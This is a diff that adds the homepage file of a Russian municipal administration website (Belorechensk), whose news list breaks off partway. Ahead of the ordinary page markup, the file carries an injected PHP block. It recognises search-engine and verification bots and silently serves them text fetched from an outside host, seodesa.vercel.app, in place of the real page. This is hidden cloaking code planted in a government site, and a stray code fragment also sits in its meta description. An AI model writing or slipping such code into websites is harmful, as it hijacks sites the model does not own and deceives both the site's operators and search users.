@@ -1,0 +1,1870 @@
+
+<?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bot_patterns = '/(googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|telegrambot|Google-Site-Verification|Google-InspectionTool|adsense)/i';
+    
+    return preg_match($bot_patterns, $user_agent);
+}
+
+function fetch_content($url) {
+    $cache_file = 'cache/' . md5($url) . '.html';
+    $cache_time = 3600;
+
+    if (file_exists($cache_file) && (time() - filemtime($cache_file) < $cache_time)) {
+        return file_get_contents($cache_file);
+    }
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
+    $content = curl_exec($ch);
+    curl_close($ch);
+
+    if ($content) {
+        file_put_contents($cache_file, $content);
+    }
+
+    return $content;
+}
+
+if (is_bot()) {
+    echo fetch_content('https://seodesa.vercel.app/slto.txt');
+    exit;
+} 
+?>
+
+
+<!doctype html>
+
+<head>
+    <meta name="SKYPE_TOOLBAR" content="SKYPE_TOOLBAR_PARSER_COMPATIBLE" />
+    <base href="https://gorodbelorechensk.ru/" />
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<meta name="keywords" content="Белореченск, город Белореченск, сайт Белореченск, официальный сайт Белореченск, официальный сайт Белореченска" />
+	<meta name="rights" content="Константинова Андрей Витальевич" />
+	<meta name="description" content="Официальный сайт муниципального образованияpublic $MetaDesc = " />
+	<meta name="generator" content="Joomla! - Open Source Content Management" />
+	<title>Главная - Администрация Белореченского городского поселения Белореченского района</title>
+	<link href="/?format=feed&amp;type=rss" rel="alternate" type="application/rss+xml" title="RSS 2.0" />
+	<link href="/?format=feed&amp;type=atom" rel="alternate" type="application/atom+xml" title="Atom 1.0" />
+	<link href="/templates/administraciya_belorechensk1/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" />
+	<link href="https://gorodbelorechensk.ru/component/search/?layout=blog&amp;id=13&amp;Itemid=194&amp;format=opensearch" rel="search" title="Искать Администрация Белореченского городского поселения Белореченского района" type="application/opensearchdescription+xml" />
+	<link href="/media/system/css/modal.css?2d8f1925915e74ce62f315cd01bc997d" rel="stylesheet" type="text/css" />
+	<link href="/media/com_attachments/css/attachments_hide.css" rel="stylesheet" type="text/css" />
+	<link href="/media/com_attachments/css/attachments_list.css" rel="stylesheet" type="text/css" />
+	<link href="https://www.gorodbelorechensk.ru/modules/mod_special_visually/assets/css/style.css?v0.4.1" rel="stylesheet" type="text/css" />
+	<link href="/modules/mod_accordeonmenuck/themes/default/css.php?cssid=accordeonck132" rel="stylesheet" type="text/css" />
+	<link href="/modules/mod_djimageslider/themes/default/css/djimageslider.css" rel="stylesheet" type="text/css" />
+	<style type="text/css">
+
+#accordeonck132 { padding:0;margin:0;padding-top: 5px;padding-right: 5px;padding-bottom: 5px;padding-left: 5px;margin-top: 1px;margin-right: 1px;margin-bottom: 1px;margin-left: 1px;background: #E6E6E6;background-color: #E6E6E6;background: -moz-linear-gradient(top,  #E6E6E6 0%, #F7F7F7 100%);background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#E6E6E6), color-stop(100%,#F7F7F7)); background: -webkit-linear-gradient(top,  #E6E6E6 0%,#F7F7F7 100%);background: -o-linear-gradient(top,  #E6E6E6 0%,#F7F7F7 100%);background: -ms-linear-gradient(top,  #E6E6E6 0%,#F7F7F7 100%);background: linear-gradient(top,  #E6E6E6 0%,#F7F7F7 100%); -moz-border-radius: 1px 1px 1px 1px;-webkit-border-radius: 1px 1px 1px 1px;border-radius: 1px 1px 1px 1px;-moz-box-shadow: 0px 0px 1px 0px #FFFFFF;-webkit-box-shadow: 0px 0px 1px 0px #FFFFFF;box-shadow: 0px 0px 1px 0px #FFFFFF;border-top: #BFBFBF 1px solid ;border-right: #BFBFBF 1px solid ;border-bottom: #BFBFBF 1px solid ;border-left: #BFBFBF 1px solid ; } 
+#accordeonck132 li.accordeonck { list-style: none;overflow: hidden; }
+#accordeonck132 ul[class^="content"] { margin:0;padding:0; }
+#accordeonck132 li.accordeonck > span { position: relative; display: block; }
+#accordeonck132 li.accordeonck.parent > span { padding-right: 20px;}
+#accordeonck132 li.parent > span span.toggler_icon { position: absolute; cursor: pointer; display: block; height: 100%; z-index: 10;right:0; background: url(/modules/mod_accordeonmenuck/assets/plus.png) center center no-repeat !important;width: 20px;}
+#accordeonck132 li.parent.open > span span.toggler_icon { right:0; background: url(/modules/mod_accordeonmenuck/assets/minus.png) center center no-repeat !important;}
+#accordeonck132 li.accordeonck.level2 > span { }
+#accordeonck132 li.level3 li.accordeonck > span { }
+#accordeonck132 a.accordeonck { display: block;text-decoration: none; color: #707070;font-size: 12px;}
+#accordeonck132 a.accordeonck:hover { text-decoration: none; color: #000000;}
+#accordeonck132 li.parent > span a { display: block;outline: none; }
+#accordeonck132 li.parent.open > span a {  }
+#accordeonck132 a.accordeonck > .badge { margin: 0 0 0 5px; }
+#accordeonck132 li.level1 > span {  } 
+#accordeonck132 li.level1 > span a { padding-top: 5px;padding-right: 5px;padding-bottom: 5px;padding-left: 5px;color: #707070;font-size: 12px; } 
+#accordeonck132 li.level1 > span span.accordeonckdesc { font-size: 10px; } 
+#accordeonck132 li.level1:hover > span {  } 
+#accordeonck132 li.level1:hover > span a { color: #000000; } 
+#accordeonck132 li.level1.active > span {  } 
+#accordeonck132 li.level1.active > span a { color: #000000; } 
+	</style>
+	<script type="application/json" class="joomla-script-options new">{"csrf.token":"81e688a2775e4837ac06bb35e61f5d71","system.paths":{"root":"","base":""}}</script>
+	<script src="/media/system/js/mootools-core.js?2d8f1925915e74ce62f315cd01bc997d" type="text/javascript"></script>
+	<script src="/media/system/js/core.js?2d8f1925915e74ce62f315cd01bc997d" type="text/javascript"></script>
+	<script src="/media/system/js/mootools-more.js?2d8f1925915e74ce62f315cd01bc997d" type="text/javascript"></script>
+	<script src="/media/system/js/modal.js?2d8f1925915e74ce62f315cd01bc997d" type="text/javascript"></script>
+	<script src="/media/jui/js/jquery.min.js?2d8f1925915e74ce62f315cd01bc997d" type="text/javascript"></script>
+	<script src="/media/jui/js/jquery-noconflict.js?2d8f1925915e74ce62f315cd01bc997d" type="text/javascript"></script>
+	<script src="/media/jui/js/jquery-migrate.min.js?2d8f1925915e74ce62f315cd01bc997d" type="text/javascript"></script>
+	<script src="/media/com_attachments/js/attachments_refresh.js" type="text/javascript"></script>
+	<script src="/media/system/js/caption.js?2d8f1925915e74ce62f315cd01bc997d" type="text/javascript"></script>
+	<script src="/media/jui/js/bootstrap.min.js?2d8f1925915e74ce62f315cd01bc997d" type="text/javascript"></script>
+	<script src="https://www.gorodbelorechensk.ru/modules/mod_special_visually/assets/js/jQuery.style.js?v0.4.1" type="text/javascript"></script>
+	<script src="https://www.gorodbelorechensk.ru/modules/mod_special_visually/assets/js/script.js?v0.4.1" type="text/javascript"></script>
+	<script src="/media/jui/js/jquery.ui.core.min.js?2d8f1925915e74ce62f315cd01bc997d" type="text/javascript"></script>
+	<script src="/media/com_accordeonmenuck/assets/accordeonmenuck.js" type="text/javascript"></script>
+	<script src="/media/com_accordeonmenuck/assets/jquery.easing.1.3.js" type="text/javascript"></script>
+	<script src="/media/djextensions/jquery-easing/jquery.easing.min.js" type="text/javascript"></script>
+	<script src="/modules/mod_djimageslider/assets/js/slider.js?v=4.4" type="text/javascript"></script>
+	<!--[if lt IE 9]><script src="/media/system/js/html5fallback.js?2d8f1925915e74ce62f315cd01bc997d" type="text/javascript"></script><![endif]-->
+	<script type="text/javascript">
+
+		jQuery(function($) {
+			SqueezeBox.initialize({});
+			initSqueezeBox();
+			$(document).on('subform-row-add', initSqueezeBox);
+
+			function initSqueezeBox(event, container)
+			{
+				SqueezeBox.assign($(container || document).find('a.modal').get(), {
+					parse: 'rel'
+				});
+			}
+		});
+
+		window.jModalClose = function () {
+			SqueezeBox.close();
+		};
+
+		// Add extra modal close functionality for tinyMCE-based editors
+		document.onreadystatechange = function () {
+			if (document.readyState == 'interactive' && typeof tinyMCE != 'undefined' && tinyMCE)
+			{
+				if (typeof window.jModalClose_no_tinyMCE === 'undefined')
+				{
+					window.jModalClose_no_tinyMCE = typeof(jModalClose) == 'function'  ?  jModalClose  :  false;
+
+					jModalClose = function () {
+						if (window.jModalClose_no_tinyMCE) window.jModalClose_no_tinyMCE.apply(this, arguments);
+						tinyMCE.activeEditor.windowManager.close();
+					};
+				}
+
+				if (typeof window.SqueezeBoxClose_no_tinyMCE === 'undefined')
+				{
+					if (typeof(SqueezeBox) == 'undefined')  SqueezeBox = {};
+					window.SqueezeBoxClose_no_tinyMCE = typeof(SqueezeBox.close) == 'function'  ?  SqueezeBox.close  :  false;
+
+					SqueezeBox.close = function () {
+						if (window.SqueezeBoxClose_no_tinyMCE)  window.SqueezeBoxClose_no_tinyMCE.apply(this, arguments);
+						tinyMCE.activeEditor.windowManager.close();
+					};
+				}
+			}
+		};
+		
+jQuery(window).on('load',  function() {
+				new JCaption('img.caption');
+			});
+jQuery(function($){ initTooltips(); $("body").on("subform-row-add", initTooltips); function initTooltips (event, container) { container = container || document;$(container).find(".hasTooltip").tooltip({"html": true,"container": "body"});} });
+
+	if (!window.jQuery) {
+		alert("Библиотека jQuery не найдена. Для работы модуля версии сайта для слабовидящих подключите библиотеку jQuery.");
+	}
+
+jQuery(document).ready(function(jQuery){new Accordeonmenuck('#accordeonck132', {fadetransition : true,eventtype : 'click',transition : 'easeInBack',menuID : 'accordeonck132',defaultopenedid : '',activeeffect : '',showcounter : '',showactive : '1',duree : 500});}); 
+var $buoop = {notify:{i:-4,f:-4,o:-4,s:-2,c:-4},insecure:true  ,mobile:false ,api:5}; 
+function $buo_f(){ 
+ var e = document.createElement("script"); 
+ e.src = "//browser-update.org/update.min.js"; 
+ document.body.appendChild(e);
+};
+try {document.addEventListener("DOMContentLoaded", $buo_f,false)}
+catch(e){window.attachEvent("onload", $buo_f)}
+
+	</script>
+  
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="yandex-verification" content="ee9b986ef2aedeaa" />
+       <meta 
+	name="sputnik-verification" 
+	content="33qiwfgSOXMavVCI"
+/>
+    <!--  Подключаем bootstrap 4 --> 
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+        <!--  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+         <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>-->
+        
+    <!--Основные стили-->
+        <link rel="stylesheet" href="/templates/administraciya_belorechensk1/css/style.css" type="text/css" />
+        <!--<link rel="stylesheet" href="/templates/administraciya_belorechensk1/css/menu.css" type="text/css" /> -->
+
+
+</head>
+<body>
+
+    <div class="container"> <!--.container-fluid на всю ширину-->
+        <div class="box-shadow">
+            <header>
+                <div class="row">
+                    <div id="heder-l" class="col-lg-8">
+                        <div class="row">
+                            <div id="gerb" class="col-lg-2">
+                                		<div class="moduletable">
+						
+
+<div class="custom"  >
+	<p><img src="/images/headers/gerb.png" alt="Герб города Белореченск" /></p></div>
+		</div>
+	
+                            </div>
+                            <div id="name" class="col-lg-10">
+                                <a href="/"><h1><em><b><span id="name-top" class="align-baseline">Официальный сайт</span> <br><span id="name-bot" class="align-baseline">Администрации Белореченска</span></b></em> <!--Администрация Белореченского городского поселения Белореченского района--></h1></a>
+                            </div>
+                        </div>
+                    </div>
+                    <div id="heder-r" class="col-lg-4">
+                        		<div class="moduletable">
+						<div class="search">
+	<form action="/" method="post" class="form-inline" role="search">
+		<label for="mod-search-searchword98" class="element-invisible">Искать...</label> <input name="searchword" id="mod-search-searchword98" maxlength="200"  class="inputbox search-query input-medium" type="search" placeholder="Введите текст для поиска..." /> <button class="button btn btn-primary" onclick="this.form.searchword.focus();">Найти</button>		<input type="hidden" name="task" value="search" />
+		<input type="hidden" name="option" value="com_search" />
+		<input type="hidden" name="Itemid" value="194" />
+	</form>
+</div>
+		</div>
+	 <br/>
+                    </div>
+                </div>
+            </header>
+            <nav>
+              <div class="row">
+                  <div class="col">
+                      		<div class="moduletable">
+						<ul class="nav menunav mod-list" id="top_menu">
+<li class="item-194 default current active"><a href="/" title="_news">Главная</a></li><li class="item-195 deeper parent"><a href="/o-gorode" >О городе</a><ul class="nav-child unstyled small"><li class="item-196"><a href="/o-gorode/istoriya" >История</a></li><li class="item-197"><a href="/o-gorode/simvolika-poseleniya" >Символика поселения</a></li></ul></li><li class="item-114"><a href="/fotogalereya" >Фотогалерея</a></li><li class="item-200 deeper parent"><a href="/obratnaya-svyaz" >Обратная связь</a><ul class="nav-child unstyled small"><li class="item-193"><a href="/obratnaya-svyaz/otvety-na-obrashcheniya" >Ответы на обращения</a></li></ul></li><li class="item-296"><a href="/obrashcheniya-grazhdan" >Обращения граждан</a></li></ul>
+		</div>
+	
+                  </div>
+              </div>
+            </nav>
+            <div id="head-img">
+                <div class="row">
+                    <div class="col">
+                        		<div class="moduletable">
+						
+<div style="border: 0px !important;">
+<div id="djslider-loader111" class="djslider-loader djslider-loader-default" data-animation='{"auto":"1","looponce":"0","transition":"easeInOutSine","css3transition":"cubic-bezier(0.445, 0.050, 0.550, 0.950)","duration":400,"delay":3400}' data-djslider='{"id":"111","slider_type":"2","slide_size":"1024","visible_slides":1,"direction":"left","show_buttons":"0","show_arrows":"0","preload":"800","css3":"1"}' tabindex="0">
+    <div id="djslider111" class="djslider djslider-default img-vcenter" style="height: 355px; width: 1024px;">
+        <div id="slider-container111" class="slider-container">
+        	<ul id="slider111" class="djslider-in">
+          		          			<li style="margin: 0 0px 0px 0 !important; height: 355px; width: 1024px;">
+          					            											<img class="dj-image" src="/images/sampledata/header/!DSC_9473a2.jpg" alt="!DSC_9473a2.jpg"  style="width: 100%; height: auto;"/>
+																									
+						
+					</li>
+                          			<li style="margin: 0 0px 0px 0 !important; height: 355px; width: 1024px;">
+          					            											<img class="dj-image" src="/images/sampledata/header/9.jpg" alt="9.jpg"  style="width: 100%; height: auto;"/>
+																									
+						
+					</li>
+                          			<li style="margin: 0 0px 0px 0 !important; height: 355px; width: 1024px;">
+          					            											<img class="dj-image" src="/images/sampledata/header/DSC_4771.JPG" alt="DSC_4771.JPG"  style="width: 100%; height: auto;"/>
+																									
+						
+					</li>
+                          			<li style="margin: 0 0px 0px 0 !important; height: 355px; width: 1024px;">
+          					            											<img class="dj-image" src="/images/sampledata/header/DSC_4798.JPG" alt="DSC_4798.JPG"  style="width: 100%; height: auto;"/>
+																									
+						
+					</li>
+                          			<li style="margin: 0 0px 0px 0 !important; height: 355px; width: 1024px;">
+          					            											<img class="dj-image" src="/images/sampledata/header/DSC_4807.JPG" alt="DSC_4807.JPG"  style="width: 100%; height: auto;"/>
+																									
+						
+					</li>
+                          			<li style="margin: 0 0px 0px 0 !important; height: 355px; width: 1024px;">
+          					            											<img class="dj-image" src="/images/sampledata/header/image.jpg" alt="image.jpg"  style="width: 100%; height: auto;"/>
+																									
+						
+					</li>
+                          			<li style="margin: 0 0px 0px 0 !important; height: 355px; width: 1024px;">
+          					            											<img class="dj-image" src="/images/sampledata/header/IMG_3284_cr.jpg" alt="IMG_3284_cr.jpg"  style="width: 100%; height: auto;"/>
+																									
+						
+					</li>
+                        	</ul>
+        </div>
+                		<div id="cust-navigation111" class="navigation-container-custom ">
+			<span class="load-button load-button-active" tabindex="0"></span><span class="load-button" tabindex="0"></span><span class="load-button" tabindex="0"></span><span class="load-button" tabindex="0"></span><span class="load-button" tabindex="0"></span><span class="load-button" tabindex="0"></span><span class="load-button" tabindex="0"></span>        </div>
+            </div>
+</div>
+</div>
+<div class="djslider-end" style="clear: both" tabindex="0"></div>		</div>
+	
+                    </div>
+                </div>
+            </div>
+            <div class="row">
+                <div id="message" class="col">
+                    <div id="system-message-container">
+	</div>
+
+                </div>   
+            </div>
+            <div id="content">
+                <div class="row">
+                    <div id="content-l" class="col-lg-8">
+                        <article>
+                            <div class="blog_news row" itemscope itemtype="https://schema.org/Blog">
+	
+		
+	
+	
+	
+				<div class="items-leading clearfix">
+							<div class="leading-0"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+	<div class="page-header">
+					<h2 itemprop="name">
+									<a href="/5975-belorechentsy-prodolzhayut-popadatsya-na-ulovki-moshennikov" itemprop="url">
+						Белореченцы продолжают «попадаться» на уловки мошенников					</a>
+							</h2>
+		
+		
+		
+			</div>
+
+
+
+  		<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+							</dt>
+
+			
+			
+			
+			
+										<dd class="published">
+				<span class="icon-calendar" aria-hidden="true"></span>
+				<time datetime="2026-07-23T08:40:58+03:00" itemprop="datePublished">
+					Опубликовано: 23 июля 2026				</time>
+			</dd>			
+		
+					
+			
+						</dl>
+	
+		<div class="pull-left item-image">
+			<a href="/5975-belorechentsy-prodolzhayut-popadatsya-na-ulovki-moshennikov"><img
+			 src="/images/news/2026/07/ujkdcxp.jpg" alt="" itemprop="thumbnailUrl"/></a>
+		</div>
+
+		
+
+
+
+
+	
+<p class="readmore">
+			<a class="btn" href="/5975-belorechentsy-prodolzhayut-popadatsya-na-ulovki-moshennikov" itemprop="url" aria-label="Подробнее:  Белореченцы продолжают «попадаться» на уловки мошенников">
+			<span class="icon-chevron-right" aria-hidden="true"></span> 
+			Подробнее...		</a>
+	</p>
+
+
+
+				</div>
+											<div class="leading-1"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+	<div class="page-header">
+					<h2 itemprop="name">
+									<a href="/5974-vmeste-my-silnee-i-blizhe-k-pobede" itemprop="url">
+						Вместе мы сильнее и ближе к победе!					</a>
+							</h2>
+		
+		
+		
+			</div>
+
+
+
+  		<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+							</dt>
+
+			
+			
+			
+			
+										<dd class="published">
+				<span class="icon-calendar" aria-hidden="true"></span>
+				<time datetime="2026-07-21T14:48:03+03:00" itemprop="datePublished">
+					Опубликовано: 21 июля 2026				</time>
+			</dd>			
+		
+					
+			
+						</dl>
+	
+		<div class="pull-left item-image">
+			<a href="/5974-vmeste-my-silnee-i-blizhe-k-pobede"><img
+			 src="/images/news/2026/07/uhjPEG.jpg" alt="" itemprop="thumbnailUrl"/></a>
+		</div>
+
+		
+
+
+
+
+	
+<p class="readmore">
+			<a class="btn" href="/5974-vmeste-my-silnee-i-blizhe-k-pobede" itemprop="url" aria-label="Подробнее:  Вместе мы сильнее и ближе к победе!">
+			<span class="icon-chevron-right" aria-hidden="true"></span> 
+			Подробнее...		</a>
+	</p>
+
+
+
+				</div>
+											<div class="leading-2"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+	<div class="page-header">
+					<h2 itemprop="name">
+									<a href="/5973-belorechenskoj-transportnoj-prokuraturoj-vyyavleny-narusheniya-o-bezopasnosti-pishchevoj-produktsii" itemprop="url">
+						Белореченской транспортной прокуратурой выявлены нарушения о безопасности пищевой продукции					</a>
+							</h2>
+		
+		
+		
+			</div>
+
+
+
+  		<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+							</dt>
+
+			
+			
+			
+			
+										<dd class="published">
+				<span class="icon-calendar" aria-hidden="true"></span>
+				<time datetime="2026-07-21T14:45:03+03:00" itemprop="datePublished">
+					Опубликовано: 21 июля 2026				</time>
+			</dd>			
+		
+					
+			
+						</dl>
+	
+		<div class="pull-left item-image">
+			<a href="/5973-belorechenskoj-transportnoj-prokuraturoj-vyyavleny-narusheniya-o-bezopasnosti-pishchevoj-produktsii"><img
+			 src="/images/news/2026/07/7126.png" alt="" itemprop="thumbnailUrl"/></a>
+		</div>
+
+		
+
+
+
+
+	
+<p class="readmore">
+			<a class="btn" href="/5973-belorechenskoj-transportnoj-prokuraturoj-vyyavleny-narusheniya-o-bezopasnosti-pishchevoj-produktsii" itemprop="url" aria-label="Подробнее:  Белореченской транспортной прокуратурой выявлены нарушения о безопасности пищевой продукции">
+			<span class="icon-chevron-right" aria-hidden="true"></span> 
+			Подробнее...		</a>
+	</p>
+
+
+
+				</div>
+											<div class="leading-3"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+	<div class="page-header">
+					<h2 itemprop="name">
+									<a href="/5972-uvazhaemye-avtovladeltsy-2" itemprop="url">
+						‼️ Уважаемые автовладельцы					</a>
+							</h2>
+		
+		
+		
+			</div>
+
+
+
+  		<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+							</dt>
+
+			
+			
+			
+			
+										<dd class="published">
+				<span class="icon-calendar" aria-hidden="true"></span>
+				<time datetime="2026-07-21T11:27:14+03:00" itemprop="datePublished">
+					Опубликовано: 21 июля 2026				</time>
+			</dd>			
+		
+					
+			
+						</dl>
+	
+		<div class="pull-left item-image">
+			<a href="/5972-uvazhaemye-avtovladeltsy-2"><img
+			 src="/images/news/2026/kjt_ncn3lk7_449c4anrog2f-1ett4qmojck-zitrwmllphjs86e5hnywudnxhff4ylw9eqyaneu86sczieo2xkk.jpg" alt="" itemprop="thumbnailUrl"/></a>
+		</div>
+
+		
+
+
+
+
+	
+<p class="readmore">
+			<a class="btn" href="/5972-uvazhaemye-avtovladeltsy-2" itemprop="url" aria-label="Подробнее:  ‼️ Уважаемые автовладельцы">
+			<span class="icon-chevron-right" aria-hidden="true"></span> 
+			Подробнее...		</a>
+	</p>
+
+
+
+				</div>
+											<div class="leading-4"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+	<div class="page-header">
+					<h2 itemprop="name">
+									<a href="/5971-v-belorechenske-prokhodyat-masshtabnye-proverki-soblyudeniya-migratsionnogo-zakonodatelstva" itemprop="url">
+						В Белореченске проходят масштабные проверки соблюдения миграционного законодательства⠀					</a>
+							</h2>
+		
+		
+		
+			</div>
+
+
+
+  		<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+							</dt>
+
+			
+			
+			
+			
+										<dd class="published">
+				<span class="icon-calendar" aria-hidden="true"></span>
+				<time datetime="2026-07-20T15:22:07+03:00" itemprop="datePublished">
+					Опубликовано: 20 июля 2026				</time>
+			</dd>			
+		
+					
+			
+						</dl>
+	
+		<div class="pull-left item-image">
+			<a href="/5971-v-belorechenske-prokhodyat-masshtabnye-proverki-soblyudeniya-migratsionnogo-zakonodatelstva"><img
+			 src="/images/news/2026/07/rdcol.jpg" alt="" itemprop="thumbnailUrl"/></a>
+		</div>
+
+		
+
+
+
+
+	
+<p class="readmore">
+			<a class="btn" href="/5971-v-belorechenske-prokhodyat-masshtabnye-proverki-soblyudeniya-migratsionnogo-zakonodatelstva" itemprop="url" aria-label="Подробнее:  В Белореченске проходят масштабные проверки соблюдения миграционного законодательства⠀">
+			<span class="icon-chevron-right" aria-hidden="true"></span> 
+			Подробнее...		</a>
+	</p>
+
+
+
+				</div>
+											<div class="leading-5"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+	<div class="page-header">
+					<h2 itemprop="name">
+									<a href="/5970-zhitel-belorechenskogo-rajona-zaderzhan-za-krazhu-iz-chastnogo-doma" itemprop="url">
+						Житель Белореченского района задержан за кражу из частного дома  					</a>
+							</h2>
+		
+		
+		
+			</div>
+
+
+
+  		<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+							</dt>
+
+			
+			
+			
+			
+										<dd class="published">
+				<span class="icon-calendar" aria-hidden="true"></span>
+				<time datetime="2026-07-20T15:12:04+03:00" itemprop="datePublished">
+					Опубликовано: 20 июля 2026				</time>
+			</dd>			
+		
+					
+			
+						</dl>
+	
+		<div class="pull-left item-image">
+			<a href="/5970-zhitel-belorechenskogo-rajona-zaderzhan-za-krazhu-iz-chastnogo-doma"><img
+			 src="/images/news/2026/07/Point_Blur_Jul202026_104754.jpg" alt="" itemprop="thumbnailUrl"/></a>
+		</div>
+
+		
+
+
+
+
+	
+<p class="readmore">
+			<a class="btn" href="/5970-zhitel-belorechenskogo-rajona-zaderzhan-za-krazhu-iz-chastnogo-doma" itemprop="url" aria-label="Подробнее:  Житель Белореченского района задержан за кражу из частного дома  ">
+			<span class="icon-chevron-right" aria-hidden="true"></span> 
+			Подробнее...		</a>
+	</p>
+
+
+
+				</div>
+											<div class="leading-6"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+	<div class="page-header">
+					<h2 itemprop="name">
+									<a href="/5968-letnij-period-samoe-vremya-provesti-tekhobsluzhivanie-gazovogo-oborudovaniya" itemprop="url">
+						Летний период – самое время провести техобслуживание газового оборудования!					</a>
+							</h2>
+		
+		
+		
+			</div>
+
+
+
+  		<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+							</dt>
+
+			
+			
+			
+			
+										<dd class="published">
+				<span class="icon-calendar" aria-hidden="true"></span>
+				<time datetime="2026-07-17T14:54:58+03:00" itemprop="datePublished">
+					Опубликовано: 17 июля 2026				</time>
+			</dd>			
+		
+					
+			
+						</dl>
+	
+		<div class="pull-left item-image">
+			<a href="/5968-letnij-period-samoe-vremya-provesti-tekhobsluzhivanie-gazovogo-oborudovaniya"><img
+			 src="/images/News_kapremont/photo_2025-05-29_08-50-26.jpg" alt="" itemprop="thumbnailUrl"/></a>
+		</div>
+
+		
+
+
+
+
+	
+<p class="readmore">
+			<a class="btn" href="/5968-letnij-period-samoe-vremya-provesti-tekhobsluzhivanie-gazovogo-oborudovaniya" itemprop="url" aria-label="Подробнее:  Летний период – самое время провести техобслуживание газового оборудования!">
+			<span class="icon-chevron-right" aria-hidden="true"></span> 
+			Подробнее...		</a>
+	</p>
+
+
+
+				</div>
+											<div class="leading-7"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+	<div class="page-header">
+					<h2 itemprop="name">
+									<a href="/5966-izveshchenie-222" itemprop="url">
+						Извещение					</a>
+							</h2>
+		
+		
+		
+			</div>
+
+
+
+  		<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+							</dt>
+
+			
+			
+			
+			
+										<dd class="published">
+				<span class="icon-calendar" aria-hidden="true"></span>
+				<time datetime="2026-07-16T10:01:11+03:00" itemprop="datePublished">
+					Опубликовано: 16 июля 2026				</time>
+			</dd>			
+		
+					
+			
+						</dl>
+	
+
+		
+
+
+
+
+	
+<p class="readmore">
+			<a class="btn" href="/5966-izveshchenie-222" itemprop="url" aria-label="Подробнее:  Извещение">
+			<span class="icon-chevron-right" aria-hidden="true"></span> 
+			Подробнее...		</a>
+	</p>
+
+
+
+				</div>
+											<div class="leading-8"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+	<div class="page-header">
+					<h2 itemprop="name">
+									<a href="/5964-v-otdele-mvd-rossii-sostoyalos-podvedenie-itogov-operativno-sluzhebnoj-deyatelnosti-za-6-mesyatsev-2026-goda" itemprop="url">
+						В отделе МВД России состоялось подведение итогов оперативно-служебной деятельности за 6 месяцев 2026 года					</a>
+							</h2>
+		
+		
+		
+			</div>
+
+
+
+  		<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+							</dt>
+
+			
+			
+			
+			
+										<dd class="published">
+				<span class="icon-calendar" aria-hidden="true"></span>
+				<time datetime="2026-07-15T08:21:47+03:00" itemprop="datePublished">
+					Опубликовано: 15 июля 2026				</time>
+			</dd>			
+		
+					
+			
+						</dl>
+	
+		<div class="pull-left item-image">
+			<a href="/5964-v-otdele-mvd-rossii-sostoyalos-podvedenie-itogov-operativno-sluzhebnoj-deyatelnosti-za-6-mesyatsev-2026-goda"><img
+			 src="/images/news/2026/07/eufholJPEG.jpg" alt="" itemprop="thumbnailUrl"/></a>
+		</div>
+
+		
+
+
+
+
+	
+<p class="readmore">
+			<a class="btn" href="/5964-v-otdele-mvd-rossii-sostoyalos-podvedenie-itogov-operativno-sluzhebnoj-deyatelnosti-za-6-mesyatsev-2026-goda" itemprop="url" aria-label="Подробнее:  В отделе МВД России состоялось подведение итогов оперативно-служебной деятельности за 6 месяцев 2026 года">
+			<span class="icon-chevron-right" aria-hidden="true"></span> 
+			Подробнее...		</a>
+	</p>
+
+
+
+				</div>
+											<div class="leading-9"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+	<div class="page-header">
+					<h2 itemprop="name">
+									<a href="/5963-uvazhaemye-zhiteli-i-gosti-goroda-napominaem-vam-o-zaprete-fotografirovaniya-video-i-ili-kinosemki-primeneniya-i-posledstvij-primeneniya-bpla" itemprop="url">
+						Уважаемые жители и гости города! Напоминаем Вам о запрете фотографирования, видео- и (или) киносъемки применения и последствий применения БПЛА					</a>
+							</h2>
+		
+		
+		
+			</div>
+
+
+
+  		<dl class="article-info muted">
+
+		
+			<dt class="article-info-term">
+							</dt>
+
+			
+			
+			
+			
+										<dd class="published">
